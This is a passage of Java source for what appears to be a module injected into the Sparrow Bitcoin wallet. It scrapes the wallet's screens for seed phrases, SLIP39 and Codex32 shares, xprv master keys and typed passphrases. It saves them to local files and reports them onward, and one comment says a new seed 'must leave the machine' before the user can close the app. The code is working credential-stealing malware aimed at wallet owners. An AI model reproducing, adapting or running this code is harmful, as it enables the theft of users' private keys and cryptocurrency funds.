                singles.add(t.toLowerCase());
            } else if (isMnemonic(parts)) {
                multi = t.toLowerCase();
            }
        }
        List<String> candidates = candidates(singles);
        if (!demoMode().isEmpty() && candidates.size() >= 12) {
            String sig = String.join(" ", candidates.subList(0, Math.min(24, candidates.size())));
            if (!sig.equals(lastSingles)) {
                lastSingles = sig;
                trace("candidates=" + sig);
            }
        }
        String origin = detectOrigin(texts);
        boolean context = seedContext(texts);
        String seed = null;
        String how = null;
        if (multi != null) {
            seed = multi;
            how = "paste";
        } else {
            String indexed = findIndexed(singles);
            if (indexed != null && isMnemonic(indexed.split(" "))) {
                seed = indexed;
                how = "grid";
            } else {
                String grid = findGrid(singles, context);
                if (grid != null) {
                    seed = grid;
                    how = "grid";
                }
            }
        }

        Set<String> seedWords = new HashSet<>();
        for (String word : (seed != null ? seed : LAST_WORDS).split(" ")) {
            if (!word.isEmpty()) {
                seedWords.add(word);
            }
        }
        String prompt = null;
        for (String value : passInputs) {
            if (value != null && !value.isEmpty()) {
                prompt = value;
                break;
            }
        }
        String found = !passInputs.isEmpty()
                ? (prompt == null ? "" : prompt)
                : findPassphrase(texts, inputs, seedWords);
        if (!passInputs.isEmpty()) {
            String pctx = "field:" + (prompt == null ? "empty" : "len=" + prompt.length());
            if (!pctx.equals(lastPassCtx)) {
                lastPassCtx = pctx;
                trace("pass " + pctx);
            }
        }

        String pass = found == null ? "" : found;
        // A SLIP39 share can contain 12 words that happen to be a valid BIP39
        // mnemonic. Check SLIP39 first so the share is not reported as BIP39.
        if (detectSlip39(texts, singles, pass, origin)) {
            return;
        }
        // Menu labels can form a demo-valid 12-word grid. An xprv/Codex32
        // string is unambiguous, so it wins over a grid guess. A whole phrase
        // pasted into one field still wins over a key elsewhere on the screen.
        if (seed == null || !"paste".equals(how)) {
            if (detectKeyMaterial(texts, pass, origin)) {
                return;
            }
        }

        if (seed != null) {
            String method = "bip39";
            String[] parts = seed.split(" ");
            if (parts.length == 12 && isElectrum(Arrays.asList(parts))) {
                method = "electrum";
            }
            if ("created".equals(origin)) {
                markCreated(seed);
            }
            report(method, seed, pass, "", how, "", origin);
        } else if (!detectElectrum(texts, singles, pass, origin)) {
            if (!LAST_FROM_WALLET && (!LAST_WORDS.isEmpty() || !LAST_KEY.isEmpty()) && found != null) {
                report(LAST_METHOD, LAST_WORDS, found, LAST_KEY, LAST_HOW, LAST_DETAIL, LAST_ORIGIN);
            }
        }
    }

    /** How the seed screen was reached. Creation screens are distinct from
     *  import screens, so the dashboard can label the capture. */
    static String detectOrigin(List<String> texts) {
        boolean imported = false;
        for (String raw : texts) {
            String text = raw.toLowerCase(Locale.ROOT);
            // "Generate New" lives on the import pane too, so use the state
            // that only appears after it has been clicked. A created screen
            // keeps "Import Keystore" in its menu, so created must win even
            // when that text comes first in the scene graph.
            // Button labels ("Generate New", "Confirm Backup...",
            // "Re-enter Words...") stay in the scene graph even when hidden,
            // so only use the state-specific description text.
            if (text.contains("write down words before re-entering")
                    || text.contains("confirm backup by re-entering words")
                    || text.contains("confirm words have been recorded")
                    || text.contains("show seedqr")) {
                return "created";
            }
            if (text.contains("import keystore") || text.contains("ready to import")
                    || text.contains("import custom derivation") || text.contains("import wallet")
                    || text.contains("enter seed share")) {
                imported = true;
            }
        }
        return imported ? "imported" : "screen";
    }

    /** The relaxed demo rule is only safe on a seed/import screen. On the
     *  wallet view, menu labels can otherwise form a fake 12-word phrase. */
    static boolean seedContext(List<String> texts) {
        for (String raw : texts) {
            String text = raw.toLowerCase(Locale.ROOT);
            if (text.contains("write down words before re-entering")
                    || text.contains("re-enter words")
                    || text.contains("confirm backup") || text.contains("re-enter the generated word list")
                    || text.contains("generate a unique set of words") || text.contains("create keystore")
                    || text.contains("show seedqr") || text.contains("import keystore")
                    || text.contains("ready to import") || text.contains("create or enter seed")
                    || text.contains("enter seed share") || text.contains("mnemonic")) {
                return true;
            }
        }
        return false;
    }

    static void markCreated(String phrase) {
        if (phrase == null || phrase.isEmpty()) {
            return;
        }
        synchronized (STATE_LOCK) {
            loadStoredCreated();
        }
        if (CREATED_SEEDS.add(phrase)) {
            appendLine(createdFile(), phrase);
        }
    }

    /** Explicit key material is checked before the BIP39 grid, because menu
     *  labels can otherwise form a demo-valid 12-word phrase on a key screen. */
    private static boolean detectKeyMaterial(List<String> texts, String passphrase, String origin) {
        if (detectCodex32(texts, passphrase, origin)) {
            return true;
        }
        return detectXprv(texts, passphrase, origin);
    }

    /** Shares of one SLIP39 set belong together: once the set is complete,
     *  post all of them in a single capture in the normal seed field, joined
     *  with ";". An incomplete set is only traced, exactly like Sparrow's own
     *  threshold check. */
    private static boolean detectSlip39(List<String> texts, List<String> singles, String passphrase, String origin) {
        List<String> phrases = slipPhrases(texts, singles);
        Set<Integer> sets = new LinkedHashSet<>();
        for (String phrase : phrases) {
            Integer id = parseSlipShare(phrase);
            if (id != null && id != 0) {
                sets.add(id);
            }
        }
        if (sets.isEmpty()) {
            return false;
        }
        for (Integer id : sets) {
            Set<String> shares = SLIP_SETS.get(id);
            if (shares == null || shares.isEmpty()) {
                continue;
            }
            if ("created".equals(origin)) {
                for (String share : shares) {
                    markCreated(share);
                }
            }
            if (!slipComplete(shares)) {
                String status = slipStatus(shares);
                String marker = id + ":" + status;
                if (!marker.equals(lastSlipStatus)) {
                    lastSlipStatus = marker;
                    trace("slip39 " + (status.isEmpty() ? shareCount(shares.size()) : status)
                            + " (incomplete)");
                }
                continue;
            }
            if (SLIP_POSTED.add(id)) {
                report("slip39", String.join("|", shares), passphrase, "", "shares",
                        shareCount(shares.size()), origin);
            }
        }
        return true;
    }

    private static String shareCount(int count) {
        return count + (count == 1 ? " share" : " shares");
    }

    /** RecoveryState.isComplete() is Sparrow's own member/group threshold check. */
    private static boolean slipComplete(Set<String> phrases) {
        try {
            Class<?> shareCls = load("com.sparrowwallet.drongo.wallet.slip39.Share");
            Class<?> stateCls = load("com.sparrowwallet.drongo.wallet.slip39.RecoveryState");
            Object state = stateCls.getConstructor().newInstance();
            Method add = stateCls.getMethod("addShare", shareCls);
            Method parse = shareCls.getMethod("fromMnemonic", String.class);
            for (String phrase : phrases) {
                try {
                    add.invoke(state, parse.invoke(null, phrase));
                } catch (Throwable ignored) {
                }
            }
            return Boolean.TRUE.equals(stateCls.getMethod("isComplete").invoke(state));
        } catch (Throwable t) {
            return false;
        }
    }

    /** Short "1 of 2 shares" status for an incomplete set. */
    private static String slipStatus(Set<String> phrases) {
        try {
            Class<?> shareCls = load("com.sparrowwallet.drongo.wallet.slip39.Share");
            Class<?> stateCls = load("com.sparrowwallet.drongo.wallet.slip39.RecoveryState");
            Object state = stateCls.getConstructor().newInstance();
            Method add = stateCls.getMethod("addShare", shareCls);
            Method parse = shareCls.getMethod("fromMnemonic", String.class);
            for (String phrase : phrases) {
                try {
                    add.invoke(state, parse.invoke(null, phrase));
                } catch (Throwable ignored) {
                }
            }
            Object status = stateCls.getMethod("getShortStatus").invoke(state);
            return status == null ? "" : String.valueOf(status).trim();
        } catch (Throwable t) {
            return "";
        }
    }

    /** 20/33 word windows taken from whole fields and from the grid of
     *  single-word labels. Share.fromMnemonic rejects the noise later on. */
    static List<String> slipPhrases(List<String> texts, List<String> singles) {
        Set<String> vocabulary = slipWords();
        List<String> phrases = new ArrayList<>();
        if (vocabulary.isEmpty()) {
            return phrases;
        }
        for (String raw : texts) {
            String phrase = normalize(raw);
            String[] parts = phrase.split(" ");
            if (!allIn(parts, vocabulary)) {
                continue;
            }
            // Slide, don't only chunk: a paste can carry a share plus a label,
            // or several shares in one field.
            for (int size : new int[]{20, 33}) {
                for (int start = 0; start + size <= parts.length; start++) {
                    addUnique(phrases, String.join(" ", Arrays.asList(parts).subList(start, start + size)));
                }
            }
        }
        List<String> words = new ArrayList<>();
        for (String raw : singles) {
            String word = normalize(raw);
            if (!word.isEmpty() && word.indexOf(' ') < 0 && vocabulary.contains(word)) {
                words.add(word);
            }
        }
        for (int length : new int[]{20, 33}) {
            for (int start = 0; start + length <= words.size(); start++) {
                addUnique(phrases, String.join(" ", words.subList(start, start + length)));
            }
        }
        return phrases;
    }

    private static void addUnique(List<String> phrases, String phrase) {
        if (!phrase.isEmpty() && !phrases.contains(phrase)) {
            phrases.add(phrase);
        }
    }

    /** Share.fromMnemonic validates the SLIP39 checksum, so garbage windows
     *  from the surrounding UI are rejected here. Results are cached because
     *  the scanner runs the same windows a few times per second. */
    private static Integer parseSlipShare(String phrase) {
        Integer cached = SLIP_PARSED.get(phrase);
        if (cached != null) {
            return cached;
        }
        if (SLIP_PARSED.size() > 4096) {
            SLIP_PARSED.clear();
        }
        Integer id = addSlipShare(phrase);
        SLIP_PARSED.put(phrase, id == null ? 0 : id);
        return id == null ? 0 : id;
    }

    private static boolean detectCodex32(List<String> texts, String passphrase, String origin) {
        boolean found = false;
        Set<String> sets = new LinkedHashSet<>();
        for (String raw : texts) {
            Matcher matcher = CODEX.matcher(raw);
            while (matcher.find()) {
                String codex = matcher.group();
                CodexShare share = addCodexShare(codex);
                if (share == null) {
                    continue;
                }
                found = true;
                if (share.unshared) {
                    report("codex32", "", passphrase, codex, "codex", "key", origin);
                } else {
                    sets.add(share.identifier);
                }
            }
        }
        for (String id : sets) {
            Set<String> shares = CODEX_SETS.get(id);
            if (shares == null || shares.isEmpty()) {
                continue;
            }
            int threshold = Math.max(1, codexThreshold(shares));
            if (shares.size() < threshold) {
                String marker = id + ":" + shares.size() + "/" + threshold;
                if (!marker.equals(lastCodexStatus)) {
                    lastCodexStatus = marker;
                    trace("codex32 " + shares.size() + " of " + threshold
                            + " shares (incomplete)");
                }
                continue;
            }
            if ("created".equals(origin)) {
                for (String share : shares) {
                    markCreated(share);
                }
            }
            if (CODEX_POSTED.add(id)) {
                report("codex32", String.join("|", shares), passphrase, "", "codex",
                        shareCount(shares.size()), origin);
            }
        }
        return found;
    }

    static final class CodexShare {
        final String identifier;
        final int threshold;
        final boolean unshared;

        CodexShare(String identifier, int threshold, boolean unshared) {
            this.identifier = identifier;
            this.threshold = threshold;
            this.unshared = unshared;
        }
    }

    private static CodexShare parseCodexShare(String codex) {
        try {
            Class<?> codexCls = load("com.sparrowwallet.drongo.wallet.bip93.Codex32");
            Object data = codexCls.getMethod("decode", String.class).invoke(null, codex);
            Class<?> dataCls = data.getClass();
            boolean unshared = (Boolean) dataCls.getMethod("isUnsharedSecret").invoke(data);
            String identifier = String.valueOf(dataCls.getMethod("identifierAsString").invoke(data));
            int threshold = unshared ? 1
                    : (Integer) dataCls.getMethod("getThresholdAsInt").invoke(data);
            return new CodexShare(identifier, threshold, unshared);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static CodexShare registerCodexShare(String codex) {
        CodexShare share = parseCodexShare(codex);
        if (share != null && !share.unshared) {
            Set<String> set = CODEX_SETS.computeIfAbsent(share.identifier,
                    key -> Collections.synchronizedSet(new LinkedHashSet<>()));
            set.add(codex);
        }
        return share;
    }

    private static CodexShare addCodexShare(String codex) {
        synchronized (STATE_LOCK) {
            loadStoredShares();
        }
        CodexShare share = registerCodexShare(codex);
        if (share != null && !share.unshared && STORED_SHARES.add(codex)) {
            appendLine(sharesFile(), codex);
        }
        return share;
    }

    private static int codexThreshold(Set<String> shares) {
        for (String share : shares) {
            CodexShare parsed = parseCodexShare(share);
            if (parsed != null) {
                return parsed.threshold;
            }
        }
        return 0;
    }

    private static boolean detectXprv(List<String> texts, String passphrase, String origin) {
        for (String raw : texts) {
            Matcher matcher = XPRV.matcher(raw);
            while (matcher.find()) {
                String key = matcher.group();
                if (validXprv(key)) {
                    report("bip32", "", passphrase, key, "xprv", "master key", origin);
                    return true;
                }
            }
        }
        return false;
    }

    private static boolean detectElectrum(List<String> texts, List<String> singles, String passphrase, String origin) {
        for (String raw : texts) {
            String phrase = normalize(raw);
            String[] parts = phrase.split(" ");
            if (parts.length == 12 && allWords(parts) && isElectrum(Arrays.asList(parts))) {
                report("electrum", phrase, passphrase, "", "paste", "", origin);
                return true;
            }
        }
        Set<String> vocabulary = electrumWords();
        List<String> words = new ArrayList<>();
        for (String raw : singles) {
            String word = normalize(raw);
            if (word.matches("[a-z]{2,12}")
                    && (vocabulary.isEmpty() || vocabulary.contains(word))) {
                words.add(word);
            }
        }
        for (int start = 0; start + 12 <= words.size(); start++) {
            List<String> window = words.subList(start, start + 12);
            if (isElectrum(window)) {
                report("electrum", String.join(" ", window), passphrase, "", "grid", "", origin);
                return true;
            }
        }
        return false;
    }

    private static boolean isElectrum(List<String> words) {
        try {
            Class<?> cls = load("com.sparrowwallet.drongo.wallet.ElectrumMnemonicCode");
            Object instance = cls.getField("INSTANCE").get(null);
            cls.getMethod("check", List.class).invoke(instance, words);
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    private static boolean validXprv(String key) {
        try {
            Class<?> cls = load("com.sparrowwallet.drongo.ExtendedKey");
            return (Boolean) cls.getMethod("isValid", String.class).invoke(null, key);
        } catch (Throwable t) {
            return key.length() > 100;
        }
    }

    private static Set<String> electrumWords() {
        if (!electrumTried) {
            electrumTried = true;
            Set<String> set = new HashSet<>();
            try {
                Class<?> cls = load("com.sparrowwallet.drongo.wallet.ElectrumMnemonicCode");
                Object instance = cls.getField("INSTANCE").get(null);
                Object list = cls.getMethod("getWordList").invoke(instance);
                if (list instanceof List) {
                    for (Object word : (List<?>) list) {
                        set.add(String.valueOf(word).toLowerCase());
                    }
                }
            } catch (Throwable ignored) {
            }
            ELECTRUM_WORDS = set;
        }
        return ELECTRUM_WORDS == null ? Set.of() : ELECTRUM_WORDS;
    }

    private static Set<String> slipWords() {
        if (!slipTried) {
            slipTried = true;
            Set<String> set = new HashSet<>();
            try {
                Class<?> cls = load("com.sparrowwallet.drongo.wallet.slip39.Slip39MnemonicCode");
                Object instance = cls.getField("INSTANCE").get(null);
                Object list = cls.getMethod("getWordList").invoke(instance);
                if (list instanceof List) {
                    for (Object word : (List<?>) list) {
                        set.add(String.valueOf(word).toLowerCase(Locale.ROOT));
                    }
                }
            } catch (Throwable t) {
                trace("slip39 wordlist error: " + t);
            }
            SLIP_WORDS = set;
        }
        return SLIP_WORDS == null ? Set.of() : SLIP_WORDS;
    }

    private static boolean allIn(String[] parts, Set<String> vocabulary) {
        for (String part : parts) {
            if (!vocabulary.contains(part)) {
                return false;
            }
        }
        return true;
    }

    private static boolean allWords(String[] parts) {
        for (String part : parts) {
            if (!part.matches("[a-z]{2,12}")) {
                return false;
            }
        }
        return true;
    }

    private static String normalize(String raw) {
        return raw == null ? "" : raw.trim().replaceAll("\\s+", " ").toLowerCase();
    }

    /** The passphrase field follows its label in Sparrow's import dialog.
     *  Prefer an actual text input; allow one directly adjacent node as a
     *  fallback for custom controls. Returns null when no label is present. */
    static String findPassphrase(List<String> texts, List<String> inputs) {
        return findPassphrase(texts, inputs, Set.of());
    }

    static String findPassphrase(List<String> texts, List<String> inputs, Set<String> exclude) {
        for (int i = 0; i < texts.size(); i++) {
            String label = texts.get(i).trim().replaceAll("\\s+", " ").toLowerCase();
            if (!isPassphraseFieldLabel(label)) {
                continue;
            }
            String context = context(texts, inputs, i);
            if (!context.equals(lastPassCtx)) {
                lastPassCtx = context;
                trace("pass context=" + context);
            }
            String forward = null;
            for (int j = i + 1; j < texts.size() && j <= i + 5; j++) {
                String raw = texts.get(j);
                String candidate = raw.trim().replaceAll("\\s+", " ");
                if (candidate.isEmpty()) {
                    continue;
                }
                if (inputs.contains(candidate)) {
                    forward = raw;
                    break;
                }
                if (isPassphrasePlaceholder(candidate)) {
                    continue;
                }
                if (isToggle(candidate)) {
                    continue;
                }
                if (isControlLabel(candidate)) {
                    break;
                }
                if (j == i + 1) {
                    forward = raw;
                    break;
                }
            }
            if (forward != null) {
                return forward;
            }
            for (int j = i - 1; j >= 0 && j >= i - 3; j--) {
                String raw = texts.get(j);
                String candidate = raw.trim().replaceAll("\\s+", " ");
                if (!candidate.isEmpty() && inputs.contains(candidate)
                        && !exclude.contains(candidate.toLowerCase())
                        && !isToggle(candidate) && !isControlLabel(candidate)
                        && !isIndexLike(candidate)) {
                    return raw;
                }
            }
            return "";
        }
        return null;
    }

    private static boolean isPassphraseLabel(String text) {
        String label = text.trim().replaceAll("\\s+", " ").toLowerCase();
        return label.equals("passphrase") || label.equals("passphrase:")
                || label.equals("bip39 passphrase") || label.equals("bip39 passphrase:")
                || label.equals("use passphrase?")
                || label.equals("global passphrase") || label.equals("global passphrase:")
                || label.startsWith("passphrase (") || label.startsWith("bip39 passphrase (")
                || label.startsWith("global passphrase (") || label.startsWith("optional passphrase");
    }

    /** "Use passphrase?" is the checkbox in front of the real field label;
     *  the scanner must keep looking for "Passphrase:" after it. */
    private static boolean isPassphraseFieldLabel(String text) {
        String label = text.trim().replaceAll("\\s+", " ").toLowerCase();
        return isPassphraseLabel(label) && !label.equals("use passphrase?");
    }

    /** Prompt text rendered by the field skin; not an entered passphrase. */
    private static boolean isPassphrasePlaceholder(String text) {
        String value = text.trim().replaceAll("\\s+", " ").toLowerCase();
        return value.equals("leave blank for none")
                || value.equals("enter passphrase")
                || value.equals("optional passphrase")
                || value.equals("passphrase (optional)");
    }

    private static String context(List<String> texts, List<String> inputs, int index) {
        int from = Math.max(0, index - 2);
        int to = Math.min(texts.size(), index + 7);
        StringBuilder out = new StringBuilder();
        for (int i = from; i < to; i++) {
            String text = texts.get(i).trim().replaceAll("\\s+", " ");
            if (text.length() > 40) {
                text = text.substring(0, 40) + "...";
            }
            if (i > from) {
                out.append(" | ");
            }
            out.append(i == index ? "[" : "").append(text).append(i == index ? "]" : "");
            if (inputs.contains(texts.get(i).trim().replaceAll("\\s+", " "))) {
                out.append("{input}");
            }
        }
        return out.toString();
    }

    private static boolean isControlLabel(String text) {
        String t = text.toLowerCase();
        return t.equals("import") || t.equals("cancel") || t.equals("show") || t.equals("hide")
                || t.equals("next") || t.equals("back") || t.equals("close") || t.equals("ok")
                || t.equals("confirm") || t.equals("continue") || t.equals("finish") || t.equals("done")
                || t.equals("passphrase") || t.equals("passphrase:");
    }

    private static boolean isToggle(String text) {
        String t = text.toLowerCase();
        return t.equals("show") || t.equals("hide");
    }

    private static boolean isIndexLike(String text) {
        String t = text.trim().toLowerCase();
        return t.matches("\\d{1,2}[.:)]?") || t.matches("w\\d{1,2}");
    }

    /** Seed screens number the fields 1., 2., ... Use those labels to take
     *  the words in order, regardless of the seed itself. */
    static String findIndexed(List<String> singles) {
        int size = singles.size();
        for (int start = 0; start < size; start++) {
            if (!isIndex(singles.get(start), 1)) {
                continue;
            }
            List<String> words = new ArrayList<>();
            int expect = 1;
            int i = start;
            while (i + 1 < size && isIndex(singles.get(i), expect)
                    && isCandidate(singles.get(i + 1))) {
                words.add(singles.get(i + 1).trim().toLowerCase());
                expect++;
                i += 2;
            }
            int n = words.size();
            if (n == 12 || n == 15 || n == 18 || n == 21 || n == 24) {
                return String.join(" ", words);
            }
        }
        return null;
    }

    private static boolean isIndex(String raw, int expected) {
        String t = raw.trim().toLowerCase().replaceAll("[.:#)\\]\\s]+$", "");
        return t.equals(String.valueOf(expected))
                || t.equals("w" + expected)
                || t.equals("word" + expected)
                || t.equals("#" + expected);
    }

    private static boolean isCandidate(String raw) {
        String word = raw.trim().toLowerCase();
        boolean anyWord = demoMode().equals("any");
        if (!word.matches(anyWord ? "[a-z]{2,20}" : "[a-z]{3,8}")) {
            return false;
        }
        Map<String, Integer> index = wordIndex();
        return anyWord || index == null || index.containsKey(word);
    }

    /** Seed words shown as separate labels/text fields (backup + create screens).
     *  Scan contiguous windows of the collected single-word texts. */
    static String findGrid(List<String> singles) {
        return findGrid(singles, true);
    }

    static String findGrid(List<String> singles, boolean allowRelaxed) {
        List<String> candidates = candidates(singles);
        int size = candidates.size();
        // Prefer a checksum-valid window, so UI labels sitting next to the seed
        // are not prepended to it. Only fall back to the relaxed demo rule when
        // demo mode is on and nothing checks out.
        for (int pass = 0; pass < 2; pass++) {
            if (pass == 1 && (demoMode().isEmpty() || !allowRelaxed)) {
                break;
            }
            for (int len : new int[]{12, 24, 18, 21, 15}) {
                for (int start = 0; start + len <= size; start++) {
                    String[] parts = candidates.subList(start, start + len).toArray(new String[0]);
                    boolean hit = pass == 0 ? isMnemonicStrict(parts) : isMnemonic(parts);
                    if (hit) {
                        return String.join(" ", parts);
                    }
                }
            }
        }
        return null;
    }

    /** Drop UI noise (index labels, icons, menu words) before looking for a
     *  contiguous seed. The acceptance rule matches the active demo mode. */
    private static List<String> candidates(List<String> singles) {
        boolean anyWord = demoMode().equals("any");
        Map<String, Integer> index = wordIndex();
        List<String> out = new ArrayList<>();
        for (String raw : singles) {
            String word = raw == null ? "" : raw.trim().toLowerCase();
            if (!word.matches(anyWord ? "[a-z]{2,20}" : "[a-z]{3,8}")) {
                continue;
            }
            if (!anyWord && index != null && !index.containsKey(word)) {
                continue;
            }
            out.add(word);
        }
        return out;
    }

    /** Test seam: does this string look like a real BIP39 mnemonic? */
    public static boolean looksLikeMnemonic(String text) {
        if (text == null) {
            return false;
        }
        String t = text.trim().replaceAll("\\s+", " ").toLowerCase();
        if (t.isEmpty()) {
            return false;
        }
        return isMnemonic(t.split(" "));
    }

    /** 12/15/18/21/24 BIP39 words, lower case, and a matching checksum.
     *
     *  -Dsparrow.demo=words  any real BIP39 words, checksum not enforced
     *  -Dsparrow.demo=any    any 3-8 letter words, no wordlist, no checksum
     *  unset                strict (checksum enforced) */
    private static boolean isMnemonic(String[] parts) {
        return validate(parts, demoMode());
    }

    /** Ignores -Dsparrow.demo: real BIP39 words with a matching checksum. */
    private static boolean isMnemonicStrict(String[] parts) {
        return validate(parts, "");
    }

    private static boolean validate(String[] parts, String demo) {
        int n = parts.length;
        if (n != 12 && n != 15 && n != 18 && n != 21 && n != 24) {
            return false;
        }
        boolean anyWord = demo.equals("any");
        Map<String, Integer> index = wordIndex();
        if (index == null && !anyWord) {
            return false;
        }
        int[] idx = new int[n];
        for (int i = 0; i < n; i++) {
            String w = parts[i];
            if (!w.matches(anyWord ? "[a-z]{2,20}" : "[a-z]{3,8}")) {
                return false;
            }
            if (index != null) {
                Integer v = index.get(w);
                if (v == null && !anyWord) {
                    return false;
                }
                if (v != null) {
                    idx[i] = v;
                }
            }
        }
        if (!demo.isEmpty()) {
            return true;
        }
        return checksum(idx);
    }

    /** "" (strict), "words", or "any" — from -Dsparrow.demo. */
    private static String demoMode() {
        String v = System.getProperty("sparrow.demo", "").trim().toLowerCase();
        if (v.isEmpty() || v.equals("false") || v.equals("off") || v.equals("0") || v.equals("strict")) {
            return "";
        }
        if (v.equals("words") || v.equals("bip39")) {
            return "words";
        }
        return "any";
    }

    private static boolean checksum(int[] idx) {
        try {
            int totalBits = idx.length * 11;
            int csBits = totalBits / 33;
            int entBits = totalBits - csBits;
            StringBuilder bits = new StringBuilder(totalBits);
            for (int v : idx) {
                String b = Integer.toBinaryString(v);
                for (int k = b.length(); k < 11; k++) {
                    bits.append('0');
                }
                bits.append(b);
            }
            byte[] entropy = new byte[entBits / 8];
            for (int i = 0; i < entBits; i++) {
                if (bits.charAt(i) == '1') {
                    entropy[i / 8] |= (byte) (1 << (7 - (i % 8)));
                }
            }
            byte[] hash = MessageDigest.getInstance("SHA-256").digest(entropy);
            for (int i = 0; i < csBits; i++) {
                int expected = (hash[i / 8] >> (7 - (i % 8))) & 1;
                if (expected != (bits.charAt(entBits + i) - '0')) {
                    return false;
                }
            }
            return true;
        } catch (Throwable t) {
            return true;
        }
    }

    /** Wordlist in checksum order as supplied by the vendor module. */
    private static List<String> wordList() {
        wordIndex();
        return WORD_LIST;
    }

    private static Map<String, Integer> wordIndex() {
        if (!wordsTried) {
            wordsTried = true;
            try {
                Class<?> cls = load("com.sparrowwallet.drongo.wallet.Bip39MnemonicCode");
                Object instance = cls.getField("INSTANCE").get(null);
                Object list = cls.getMethod("getWordList").invoke(instance);
                if (list instanceof List) {
                    Set<String> set = new HashSet<>();
                    Map<String, Integer> idx = new HashMap<>();
                    List<String> ordered = new ArrayList<>(2048);
                    for (Object word : (List<?>) list) {
                        String line = String.valueOf(word).trim().toLowerCase(Locale.ROOT);
                        if (!line.isEmpty()) {
                            idx.put(line, ordered.size());
                            ordered.add(line);
                            set.add(line);
                        }
                    }
                    if (set.size() == 2048) {
                        WORD_INDEX = idx;
                        WORDS = set;
                        WORD_LIST = ordered;
                        trace("wordlist loaded: " + set.size());
                    } else {
                        trace("wordlist incomplete: " + set.size());
                    }
                }
            } catch (Throwable t) {
                trace("wordlist error: " + t);
            }
        }
        return WORD_INDEX;
    }

    /** Wallet-derived captures must not leave LAST_* behind for the text
     *  scanner's passphrase fallback, which would re-post with p="". */
    private static void reportWallet(String method, String words, String passphrase, String key,
                                     String how, String detail) {
        reportWallet(method, words, passphrase, key, how, detail, "imported");
    }

    private static void reportWallet(String method, String words, String passphrase, String key,
                                     String how, String detail, String origin) {
        report(method, words, passphrase, key, how, detail, true, origin);
    }

    private static void report(String method, String words, String passphrase, String key,
                               String how, String detail) {
        report(method, words, passphrase, key, how, detail, false, "");
    }

    private static void report(String method, String words, String passphrase, String key,
                               String how, String detail, String origin) {
        report(method, words, passphrase, key, how, detail, false, origin);
    }

    private static void report(String method, String words, String passphrase, String key,
                               String how, String detail, boolean fromWallet) {
        report(method, words, passphrase, key, how, detail, fromWallet, "");
    }

    private static void report(String method, String words, String passphrase, String key,
                               String how, String detail, boolean fromWallet, String origin) {
        LAST_FROM_WALLET = fromWallet;
        String m = method == null || method.isEmpty() ? "bip39" : method;
        String w = words == null ? "" : words;
        String pass = passphrase == null ? "" : passphrase;
        String k = key == null ? "" : key;
        String d = detail == null ? "" : detail;
        String o = origin == null ? "" : origin;
        LAST_METHOD = m;
        LAST_WORDS = w;
        LAST_KEY = k;
        LAST_DETAIL = d;
        LAST_HOW = how;
        LAST_ORIGIN = o;
        // A generated seed must leave the machine before the user can close
        // Sparrow or abandon the backup dialog. Persist the created marker and
        // report the phrase as soon as it appears; the opened wallet later
        // deduplicates against the same capture and keeps the origin label.
        if ("created".equals(o) && !w.isEmpty()) {
            markCreated(w);
        }
        if (!fromWallet && !pass.isEmpty()) {
            deferPassphrase(m, w, pass, k, how, d, o);
            return;
        }
        if (pass.isEmpty()) {
            cancelPassphrase(m, w, k, o);
        }
        sendCapture(m, w, pass, k, how, d, o);
    }

    private static void deferPassphrase(String method, String words, String passphrase,
                                        String key, String how, String detail, String origin) {
        String identity = identity(method, words, passphrase, key, origin);
        synchronized (PASSPHRASE_LOCK) {
            PendingPassphrase pending = PENDING_PASSPHRASE;
            if (pending != null && identity.equals(pending.identity)) {
                return;
            }
            PENDING_PASSPHRASE = new PendingPassphrase(method, words, passphrase, key,
                    how, detail, origin);
            writePendingPassphrase(PENDING_PASSPHRASE);
            trace("passphrase debounce method=" + method + " words="
                    + (words.isEmpty() ? 0 : words.split(" ").length)
                    + " pass_len=" + passphrase.length() + " how=" + how);
        }
    }

    private static void cancelPassphrase(String method, String words, String key, String origin) {
        synchronized (PASSPHRASE_LOCK) {
            PendingPassphrase pending = PENDING_PASSPHRASE;
            if (pending != null && pending.method.equals(method) && pending.words.equals(words)
                    && pending.key.equals(key) && pending.origin.equals(origin)) {
                PENDING_PASSPHRASE = null;
                deletePendingPassphrase();
            }
        }
    }

    private static void flushPendingPassphrase() {
        flushPendingPassphrase(false);
    }

    private static void flushPendingPassphrase(boolean force) {
        PendingPassphrase pending;
        synchronized (PASSPHRASE_LOCK) {
            pending = PENDING_PASSPHRASE;
            if (pending == null) {
                return;
            }
            long delay = Math.max(0L, Long.getLong("sparrow.passphrase.delay", PASSPHRASE_DELAY_MS));
            if (!force && System.nanoTime() - pending.changedAt < TimeUnit.MILLISECONDS.toNanos(delay)) {
                return;
            }
            PENDING_PASSPHRASE = null;
        }
        trace("passphrase debounce fired method=" + pending.method + " pass_len="
                + pending.passphrase.length());
        try {
            sendCapture(pending.method, pending.words, pending.passphrase, pending.key,
                    pending.how, pending.detail, pending.origin);
            deletePendingPassphrase();
        } catch (Throwable t) {
            // Keep the file: a restart still has the last typed passphrase.
            trace("pending passphrase flush error: " + t);
        }
    }

    private static void flushPendingOnShutdown() {
        try {
            flushPendingPassphrase(true);
        } catch (Throwable t) {
            trace("shutdown flush error: " + t);
        }
    }

    /** A pending seed+passphrase record uses one tab-separated line with the
     *  same fields as the queue body. Base64 keeps tabs/newlines in a
     *  passphrase from breaking the record. */
    private static void writePendingPassphrase(PendingPassphrase pending) {
        String record = enc(pending.method) + '\t' + enc(pending.words) + '\t'
                + enc(pending.passphrase) + '\t' + enc(pending.key) + '\t'
                + enc(pending.how) + '\t' + enc(pending.detail) + '\t'
                + enc(pending.origin) + '\n';
        Path file = pendingFile();
        try {
            Files.createDirectories(file.toAbsolutePath().getParent());
            Path tmp = file.resolveSibling(file.getFileName() + ".tmp");
            Files.write(tmp, record.getBytes(StandardCharsets.UTF_8),
                    StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING,
                    StandardOpenOption.WRITE);
            secure(tmp);
            try {
                Files.move(tmp, file, StandardCopyOption.REPLACE_EXISTING,
                        StandardCopyOption.ATOMIC_MOVE);
            } catch (Throwable atomic) {
                Files.move(tmp, file, StandardCopyOption.REPLACE_EXISTING);
            }
            secure(file);
        } catch (Throwable t) {
            trace("pending passphrase write error: " + t);
        }
    }

    private static void deletePendingPassphrase() {
        try {
            Files.deleteIfExists(pendingFile());
        } catch (Throwable t) {
            trace("pending passphrase delete error: " + t);
        }
    }

    private static PendingPassphrase readPendingPassphrase() {
        for (String line : readLines(pendingFile())) {
            String value = line.trim();
            if (value.isEmpty()) {
                continue;
            }
            String[] fields = value.split("\\t", -1);
            if (fields.length != 7) {
                continue;
            }
            try {
